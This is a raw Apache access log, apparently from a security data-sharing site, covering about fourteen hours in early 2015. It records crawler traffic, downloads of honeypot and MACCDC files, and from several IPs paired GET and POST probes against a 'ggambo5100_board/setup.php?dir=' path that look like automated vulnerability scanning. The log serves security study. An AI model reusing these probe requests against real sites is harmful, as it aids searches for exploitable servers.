104.130.161.38 - - [31/Jan/2015:11:52:42 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.38 - - [31/Jan/2015:11:52:42 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
207.46.13.97 - - [31/Jan/2015:12:04:55 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 890340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.130.161.37 - - [31/Jan/2015:12:20:16 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.37 - - [31/Jan/2015:12:20:16 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
207.46.13.97 - - [31/Jan/2015:12:39:20 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.97 - - [31/Jan/2015:12:45:08 -0800] "GET /self.logs/ HTTP/1.1" 200 800 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.79.2 - - [31/Jan/2015:13:09:12 -0800] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 16184026 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
104.130.161.37 - - [31/Jan/2015:13:40:34 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.37 - - [31/Jan/2015:13:40:34 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
104.130.161.37 - - [31/Jan/2015:14:20:54 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.37 - - [31/Jan/2015:14:20:54 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
66.249.79.2 - - [31/Jan/2015:14:24:59 -0800] "GET /maccdc2012/weird.log.gz HTTP/1.1" 200 1242777 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [31/Jan/2015:14:41:43 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
112.218.68.155 - - [31/Jan/2015:14:41:45 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)" 
104.130.161.37 - - [31/Jan/2015:14:43:15 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.37 - - [31/Jan/2015:14:43:15 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
77.232.91.201 - - [31/Jan/2015:14:44:03 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
77.232.91.201 - - [31/Jan/2015:14:44:04 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
211.47.181.38 - - [31/Jan/2015:14:44:44 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
211.47.181.38 - - [31/Jan/2015:14:44:46 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
91.121.6.123 - - [31/Jan/2015:14:47:58 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [31/Jan/2015:14:47:59 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
112.218.68.155 - - [31/Jan/2015:14:49:16 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
112.218.68.155 - - [31/Jan/2015:14:49:18 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
104.130.160.87 - - [31/Jan/2015:14:51:12 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.160.87 - - [31/Jan/2015:14:51:12 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
178.33.226.103 - - [31/Jan/2015:14:59:30 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [31/Jan/2015:14:59:31 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
199.16.156.126 - - [31/Jan/2015:15:14:55 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.126 - - [31/Jan/2015:15:14:57 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "-" "Twitterbot/1.0" 
66.249.79.2 - - [31/Jan/2015:15:40:47 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
108.56.245.250 - - [31/Jan/2015:16:38:42 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko)" 
108.56.245.250 - - [31/Jan/2015:16:38:42 -0800] "GET /twitter-icon.png HTTP/1.1" 304 165 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko)" 
108.56.245.250 - - [31/Jan/2015:16:38:45 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko)" 
98.231.230.118 - - [31/Jan/2015:16:54:23 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
98.231.230.118 - - [31/Jan/2015:16:54:24 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
98.231.230.118 - - [31/Jan/2015:16:54:25 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
157.55.39.14 - - [31/Jan/2015:17:49:30 -0800] "GET /data HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.97 - - [31/Jan/2015:18:41:02 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)" 
104.130.20.53 - - [31/Jan/2015:18:43:18 -0800] "GET /honeypot/BSidesDFW HTTP/1.1" 301 460 "-" "Tornado-Async-Client" 
104.130.20.53 - - [31/Jan/2015:18:43:18 -0800] "GET /honeypot/BSidesDFW HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
62.210.84.54 - - [31/Jan/2015:19:17:49 -0800] "GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:34.0) Gecko/20100101 Firefox/34.0" 
62.210.84.54 - - [31/Jan/2015:19:17:49 -0800] "GET / HTTP/1.1" 200 6628 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:34.0) Gecko/20100101 Firefox/34.0" 
62.210.84.54 - - [31/Jan/2015:19:17:49 -0800] "GET /zeus/zeus_json.zip HTTP/1.1" 404 339 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:34.0) Gecko/20100101 Firefox/34.0" 
62.210.84.54 - - [31/Jan/2015:19:17:49 -0800] "GET / HTTP/1.1" 200 6628 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:34.0) Gecko/20100101 Firefox/34.0" 
66.249.79.2 - - [31/Jan/2015:19:45:20 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 304 167 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.151 - - [31/Jan/2015:20:40:49 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 304 168 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.2 - - [31/Jan/2015:22:13:42 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.2 - - [31/Jan/2015:23:15:31 -0800] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20779 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
199.16.156.125 - - [31/Jan/2015:23:17:12 -0800] "GET /robots.txt HTTP/1.1" 301 446 "-" "Twitterbot/1.0" 
199.16.156.125 - - [31/Jan/2015:23:17:12 -0800] "GET / HTTP/1.1" 301 427 "-" "Twitterbot/1.0" 
199.16.156.124 - - [31/Jan/2015:23:17:12 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.124 - - [31/Jan/2015:23:17:12 -0800] "GET / HTTP/1.1" 200 6573 "-" "Twitterbot/1.0" 
66.249.79.159 - - [01/Feb/2015:00:31:18 -0800] "GET /maccdc2012/signatures.log.gz HTTP/1.1" 200 605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
192.99.107.136 - - [01/Feb/2015:01:12:14 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)" 
192.99.107.136 - - [01/Feb/2015:01:12:14 -0800] "GET / HTTP/1.1" 200 6573 "-" "Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)" 
66.249.79.159 - - [01/Feb/2015:01:12:44 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 304 168 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
157.55.39.62 - - [01/Feb/2015:01:51:12 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.166.75.132 - - [01/Feb/2015:02:07:31 -0800] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)" 
54.166.75.132 - - [01/Feb/2015:02:07:46 -0800] "GET / HTTP/1.1" 200 21186 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)" 
66.249.79.2 - - [01/Feb/2015:02:11:38 -0800] "GET / HTTP/1.1" 200 6629 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
